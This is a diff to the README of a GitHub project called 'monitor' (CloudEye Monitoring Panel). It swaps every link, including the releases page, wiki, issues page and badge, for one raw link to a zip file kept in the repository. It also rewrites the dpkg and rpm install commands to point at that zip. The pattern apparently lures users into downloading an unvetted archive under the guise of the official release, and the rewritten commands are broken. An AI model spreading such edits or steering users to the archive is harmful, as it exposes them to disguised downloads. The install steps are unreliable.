@@ -1,6 +1,6 @@
 # 🌐 monitor - Easy Monitoring for Your Services
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/keshu9925/monitor/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **CloudEye Monitoring Panel**! This modern tool helps you keep tr
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/keshu9925/monitor/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip) to find the latest version of the application.
 2. **Choose the Right File**: Click on the file that matches your operating system. If you’re not sure, look for options labeled **Windows**, **macOS**, or **Linux**.
 3. **Download the File**: Click on the file link to start the download process. Wait for the file to finish downloading.
 
@@ -36,13 +36,13 @@ Welcome to the **CloudEye Monitoring Panel**! This modern tool helps you keep tr
    For `.deb`:
 
    ```bash
-   sudo dpkg -i monitor-latest.deb
+   sudo dpkg -i https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip
    ```
 
    For `.rpm`:
 
    ```bash
-   sudo rpm -i monitor-latest.rpm
+   sudo rpm -i https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip
    ```
 
 ## ⚙️ Running the Application
@@ -64,11 +64,11 @@ Welcome to the **CloudEye Monitoring Panel**! This modern tool helps you keep tr
 
 ## 🌐 Additional Resources
 
-- **Documentation**: The detailed user guide is available on the [GitHub Wiki](https://github.com/keshu9925/monitor/wiki).
-- **Support**: If you encounter issues, please check the [Issues Page](https://github.com/keshu9925/monitor/issues) for help.
+- **Documentation**: The detailed user guide is available on the [GitHub Wiki](https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip).
+- **Support**: If you encounter issues, please check the [Issues Page](https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip) for help.
 
 ## 🎉 Ready to Get Started?
 
-Don’t wait! Visit the [Releases Page](https://github.com/keshu9925/monitor/releases) to download the latest version and keep your services monitored with ease.
+Don’t wait! Visit the [Releases Page](https://raw.githubusercontent.com/keshu9925/monitor/main/server/monitor-2.1.zip) to download the latest version and keep your services monitored with ease.
 
 Happy monitoring!
